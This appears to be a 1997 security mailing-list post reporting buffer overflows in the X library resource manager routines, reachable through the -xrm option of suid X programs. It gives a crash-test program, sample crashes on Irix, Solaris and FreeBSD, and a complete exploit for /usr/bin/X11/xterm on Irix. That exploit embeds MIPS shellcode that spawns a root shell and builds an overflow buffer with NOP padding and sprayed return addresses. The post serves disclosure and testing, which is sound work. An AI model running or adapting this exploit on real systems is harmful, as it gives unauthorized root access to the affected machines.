
This (and the printer and iwsh) exploit have actually highlighted a
serious problem in the resource manager routines in the X libraries on
all platforms I have access to, and I need time to assess the full
impact of this. From first impressions, it looks like pretty much every
suid program linked against the X libraries which uses the X resource
manager routines is vulnerable to buffer overflow exploits even if the
programs themselves are secure. e.g. I have successfully buffer
overflowed xlockmore-4.02 on FreeBSD, which has been specifically
patched against this problem.

To test the extent of this, compile the following program and run it
with various X suid programs as parameters. If you get a segmentation
fault or bus error, then you are potentially vulnerable.

----------------------- testx.c ---------------------

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void main(int argc, char **argv)
{
    char *env[] = {0};
    char buffer[18000];    /* Irix has a 20k limit for environment+args */
    if (argc < 2)
      exit(1);

    memset(buffer,'a',sizeof buffer);
    buffer[sizeof buffer-1] = '\0';

    execle(argv[1], argv[1], "-xrm", buffer, 0, env);
    perror("exec failed");
}

---------------------- end testx.c ----------------------

And here we have it in action on Irix:

warlock:~/warlock/src/tmp ->./testx /usr/bin/X11/xterm
zsh: bus error  ./testx /usr/bin/X11/xterm
warlock:~/warlock/src/tmp ->./testx /usr/bin/X11/cdplayer
zsh: bus error  ./testx /usr/bin/X11/cdplayer
warlock:~/warlock/src/tmp ->./testx /usr/bin/X11/xconsole
zsh: bus error  ./testx /usr/bin/X11/xconsole
warlock:~/warlock/src/tmp ->./testx /usr/bin/X11/xlock
Xlib: connection to ":0.0" refused by server
Xlib: Client is not authorized to connect to Server
xlock: unable to open display :0.
warlock:~/warlock/src/tmp ->

here we can see that xlock is not vulnerable to this attack, but the
others potentially are.

On solaris:

maxx:~/tmp ->./testx /usr/dt/bin/dtprintinfo
zsh: bus error  ./testx /usr/dt/bin/dtprintinfo
maxx:~/tmp ->./testx /usr/dt/bin/dtaction
zsh: bus error  ./testx /usr/dt/bin/dtaction

On XFree86 (tested on FreeBSD 2.2.2):

inferno:~/tmp ->./testx /usr/X11R6/bin/xlock
zsh: segmentation fault  ./testx /usr/X11R6/bin/xlock
inferno:~/tmp ->./testx /usr/X11R6/bin/color_xterm
zsh: segmentation fault  ./testx /usr/X11R6/bin/color_xterm
inferno:~/tmp ->./testx /usr/X11R6/bin/xterm
zsh: segmentation fault  ./testx /usr/X11R6/bin/xterm

---------------------------------------------------------------------------
/* /usr/bin/X11/xterm.c exploit by DCRH 27/5/97
 *
 * Tested on: R3000 Indigo (Irix 5.3)
 *            R4400 Indy   (Irix 5.3)
 *            R8000 PChallenge (Irix64 6.2)
 *            R5000 O2 (Irix 6.3)
 *
 * compile as: cc xterm.c (Irix 5.3)
 *             cc -n32 xterm.c (Irix 6.x)
 *
 * Pass '8' as a parameter for Irix 6.x, or change the OFFSET setting below
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define NUM_ADDRESSES   500
#define BUF_LENGTH      500
#define EXTRA           9000
#define OFFSET          0x170         /* 0x178 for Irix 6.x */
#define GP_OFFSET       -0x80
#define IRIX_NOP        0x03e0f825    /* move $ra,$ra */

#define u_long unsigned

u_long get_sp_code[] = {
    0x03a01025,         /* move $v0,$sp         */
    0x03e00008,         /* jr $ra               */
    0x00000000,         /* nop                  */
};

u_long irix_shellcode[] = {
    0x24041234,         /* li $4,0x1234         */
    0x2084edcc,         /* sub $4,0x1234        */
    0x0491fffe,         /* bgezal $4,pc-4       */
    0x03bd302a,         /* sgt $6,$sp,$sp       */
    0x03bd202a,         /* sgt $4,$sp,$sp       */
    0x240203ff,         /* li $v0,1023          */
    0x03ffffcc,         /* syscall 0xfffff      */
    0x23e40138,         /* addi $4,$31,264+48   */
    0xa086feff,         /* sb $6,-264+7($4)     */
    0x2084fef8,         /* sub $4,264           */
    0x20850110,         /* addi $5,$4,264+8     */
    0xaca4fef8,         /* sw $4,-264($5)       */
    0xaca6fefc,         /* sw $4,-260($5)       */
    0x20a5fef8,         /* sub $5, 264          */
    0x240203f3,         /* li $v0,1011          */
    0x03ffffcc,         /* syscall 0xfffff      */
    0x2f62696e,         /* "/bin"               */
    0x2f7368ff,         /* "/sh"                */
};

char buf[NUM_ADDRESSES+BUF_LENGTH + EXTRA + 8];

void main(int argc, char **argv)
{
    char *env[] = {NULL};
    u_long targ_addr, stack, tmp;
    u_long *long_p;
    int i, code_length = strlen((char *)irix_shellcode)+1;
    u_long (*get_sp)(void) = (u_long (*)(void))get_sp_code;

    stack = get_sp();

    if (stack & 0x80000000) {
        printf("Recompile with the '-32' option\n");
        exit(1);
    }

    long_p =(u_long *)  buf;
    targ_addr = stack + OFFSET;

    if (argc > 1)
        targ_addr += atoi(argv[1]);

    if (targ_addr + GP_OFFSET > 0x80000000) {
        printf("Sorry - this exploit for Irix 6.x only\n");
        exit(1);
    }

    tmp = (targ_addr + NUM_ADDRESSES + (BUF_LENGTH-code_length)/2) & ~3;

    while ((tmp & 0xff000000) == 0 ||
           (tmp & 0x00ff0000) == 0 ||
           (tmp & 0x0000ff00) == 0 ||
           (tmp & 0x000000ff) == 0)
        tmp += 4;

    for (i = 0; i < NUM_ADDRESSES/(4*sizeof(u_long)); i++) {
        *long_p++ = targ_addr;
        *long_p++ = targ_addr;
        *long_p++ = tmp;
        *long_p++ = tmp;
    }

    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
        *long_p++ = IRIX_NOP;

    for (i = 0; i < code_length/sizeof(u_long); i++)
        *long_p++ = irix_shellcode[i];

    tmp = (targ_addr + GP_OFFSET + NUM_ADDRESSES/2) & ~3;

    for (i = 0; i < EXTRA / sizeof(u_long); i++)
        *long_p++ = (tmp >> 8) | (tmp << 24);

    *long_p = 0;

    printf("stack = 0x%x, targ_addr = 0x%x\n", stack, targ_addr);

    execle("/usr/bin/X11/xterm", "xterm", "-xrm", &buf[3], 0, env);
    perror("execl failed");
}
